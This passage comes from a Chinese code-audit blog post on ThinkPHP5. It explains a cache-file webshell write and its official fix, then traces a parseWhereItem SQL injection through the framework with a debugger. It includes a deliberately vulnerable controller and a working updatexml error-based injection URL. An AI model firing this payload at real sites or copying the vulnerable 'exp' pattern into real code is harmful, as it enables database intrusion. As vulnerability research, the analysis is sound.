+<p>如下图，这里对于我们传进去的内容value没有做出任何过滤，直接就序列化，随后拼接并写入到了文件中，不过这里在拼接的时候，存在一个//注释符，但这个是单行注释，因此我们写入换行符即可绕过，也就是我们payload的样子</p>
+<p>tips：这里的 <strong>$this-&gt;options[‘data_compress’]</strong> 变量默认情况下为 <strong>false</strong> ，所以数据不会经过 <strong>gzcompress</strong> 函数处理</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614230857342.png" alt="image-20240614230857342"></p>
+<p>不过在此之前我们写入的文件名字是md5加密的那种，随机化的，但却也是可预测的（在某些条件下），我们可以跟进上图的getCacheKey函数</p>
+<p>首先这里name的值默认就是name，然后得到了加密的MD5值，随后cache_subdir默认是true，进去if语句之后，先是取了md5前两位字符，拼接符号“/”，再拼接md5后面的30为字符</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614232716467.png" alt="image-20240614232716467"></p>
+<p>继续分析能知道，这里的前两位字符被当作了目录，但这里可以看到prefix没有执行（为空），如果这里prefix指定了的话，我们这里最终还会有第二级目录，而后面的30为字符，被当作了文件名</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614233040985.png" alt="image-20240614233040985"></p>
+<p>最后，我们总结一下这个漏洞的利用条件：</p>
+<pre><code class="hljs scss">得知道缓存类所设置的键名，这样才能找到 webshell 路径；其次如果按照官方说明开发程序， webshell 最终会被写到 runtime 目录下，而官方推荐 public 作为 web 根目录，所以即便我们写入了 shell ，也无法直接访问到；最后如果程序有设置 <span class="hljs-variable">$this</span>-&gt;options<span class="hljs-selector-attr">[<span class="hljs-string">'prefix'</span>]</span> 的话，在没有源码的情况下，我们还是无法获得 webshell 的准确路径。</code></pre>
+<h3 id="漏洞修复">漏洞修复</h3>
+<p>官方的修复方法是：将数据拼接在 <strong>php</strong> 标签之外，并在 <strong>php</strong> 标签中拼接 <strong>exit()</strong> 函数。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614233458641.png" alt="image-20240614233458641"></p>
+<p>最后借用一个该漏洞的攻击流程图</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614233527799.png" alt="image-20240614233527799"></p>
+<h2 id="sql注入parsewhereitem">SQL注入—parseWhereItem</h2>
+<h3 id="概述">概述</h3>
+<p>本次漏洞存在于 <strong>Mysql</strong> 类的 <strong>parseWhereItem</strong> 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 <strong>SQL</strong> 语句，导致 <strong>SQL注入漏洞</strong> 的产生。漏洞影响版本： <strong>ThinkPHP5全版本</strong> 。</p>
+<p>由于官方根本不认为这是一个漏洞，而认为这是他们提供的一个功能，所以官方并没有对这个问题进行修复。</p>
+<p>配置数据库：application/database.php</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614190457619.png" alt="image-20240614190457619"></p>
+<p>index模块下添加一个控制器：/application/index/controller/Hello.php</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">index</span>\<span class="hljs-title class_">controller</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hello</span></span>{    
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)    </span>{        
+        <span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">request</span>()-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">'username'</span>);        
+        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">db</span>(<span class="hljs-string">'user'</span>)-&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-string">'username'</span>,<span class="hljs-string">'exp'</span>,<span class="hljs-variable">$username</span>)-&gt;<span class="hljs-title function_ invoke__">select</span>();        
+        <span class="hljs-keyword">return</span> <span class="hljs-string">'select success'</span>;    
+    }
+}</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614191027560.png" alt="image-20240614191027560"></p>
+<p><code>/application/config.php</code>开启<strong>app_debug</strong> (没开启 app_debug 是无法看到 SQL 报错信息的)、<strong>app_trace</strong>(显示SQL语句执行信息，便于调试)</p>
+<h3 id="漏洞分析">漏洞分析</h3>
+<pre><code class="hljs scss">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/thinkphp5/public/index.php/index/hello/test?username=)%<span class="hljs-number">20</span>union%<span class="hljs-number">20s</span>elect%<span class="hljs-number">20</span><span class="hljs-built_in">updatexml</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0</span>x7,<span class="hljs-built_in">user</span>(),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span></code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614191225418.png" alt="image-20240614191225418"></p>
+<p>接下来打断点分析</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614191823159.png" alt="image-20240614191823159"></p>
+<p>跟进get，这里直接就调用了input</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614191915594.png" alt="image-20240614191915594"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614192100639.png" alt="image-20240614192100639"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614192156760.png" alt="image-20240614192156760"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614192245029.png" alt="image-20240614192245029"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614192315007.png" alt="image-20240614192315007"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614192400597.png" alt="image-20240614192400597"></p>
+<p>到了这里，最终$username的值就是我们get传参进去的</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614192437964.png" alt="image-20240614192437964"></p>
+<p>连接数据库</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614192504199.png" alt="image-20240614192504199"></p>
+<p>之后跟进到了where，这里有一个func_get_args函数</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614193039819.png" alt="image-20240614193039819"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614193103849.png" alt="image-20240614193103849"></p>
+<p>举个例子</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span>(<span class="hljs-params"></span>) </span>{
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">"hello, world!!"</span>;
+}
+<span class="hljs-title function_ invoke__">foo</span>(<span class="hljs-string">'First arg'</span>, <span class="hljs-string">'Second arg'</span>);
+
+<span class="hljs-variable">$args</span> = <span class="hljs-title function_ invoke__">func_get_args</span>();
+<span class="hljs-title function_ invoke__">var_export</span>(<span class="hljs-variable">$args</span>);
+<span class="hljs-comment">//result is follow: 不过这是PHP5.3以前的输出格式</span>
+<span class="hljs-comment">//array (</span>
+<span class="hljs-comment">//  0 =&gt; 'First arg',</span>
+<span class="hljs-comment">//  1 =&gt; 'Second arg',</span>
+<span class="hljs-comment">//)</span></code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614193405681.png" alt="image-20240614193405681"></p>
+<p>这里也可以看到，param最后成为了一个字符串数组，包含的都是where函数中的三个参数；经过array_shift之后，字符串首个元素username被排除</p>
+<p>接着我们跟进parseWhereExp，这里跟进之后直接就来到下图，主要是做了一些赋值</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614193837015.png" alt="image-20240614193837015"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614194115590.png" alt="image-20240614194115590"></p>
+<p>随后来到上图最后这里，看一下array_merge函数的作用</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614194330777.png" alt="image-20240614194330777"></p>
+<p>也就是做了一个数组合并，最终的结果就完全是$where数组的值了</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614194516669.png" alt="image-20240614194516669"></p>
+<p>随后继续跟进，返回到了select函数中，跟进parseExpress</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614194908124.png" alt="image-20240614194908124"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614194856162.png" alt="image-20240614194856162"></p>
+<p>上图获取到了表名：users，然后继续跟进就到了下图，到这里就是给option变量进行了某些赋值</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614194847555.png" alt="image-20240614194847555"></p>
+<p>到最后这里，返回了当前的option参数</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614195027687.png" alt="image-20240614195027687"></p>
+<p>到了这里，生成了查询sql语句，绑定了参数，跟进select</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614195140283.png" alt="image-20240614195140283"></p>
+<p>可以看到这里是进行变量填充的，我们跟进parseWhere</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614195722440.png" alt="image-20240614195722440"></p>
+<p>继续跟进buildWhere</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614195644645.png" alt="image-20240614195644645"></p>
+<p>跟进之后发现parseWhereItem</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614195943980.png" alt="image-20240614195943980"></p>
+<p>发现这里的list函数，将val数组中的值赋值给了exp和value变量</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614200109989.png" alt="image-20240614200109989"></p>
+<p>到了下图，这里给exp变量复制成了EXP字符串</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614200212965.png" alt="image-20240614200212965"></p>
+<p>导致进入了这里的else语句块，这里可看到，直接拼接了key和value变量，没有过滤</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614200252190.png" alt="image-20240614200252190"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614200308203.png" alt="image-20240614200308203"></p>
+<p>最后返回的值whereStr如上图所示</p>
+<p>继续往下，这里开始执行查询操作</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614195322192.png" alt="image-20240614195322192"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614195348364.png" alt="image-20240614195348364"></p>
+<p>最后查询完成，释放链接</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5CThinkPHP5%E4%BB%A3%E5%AE%A1%5Cimage-20240614200454760.png" alt="image-20240614200454760"></p>
+<p>最后贴一个攻击流程图</p>
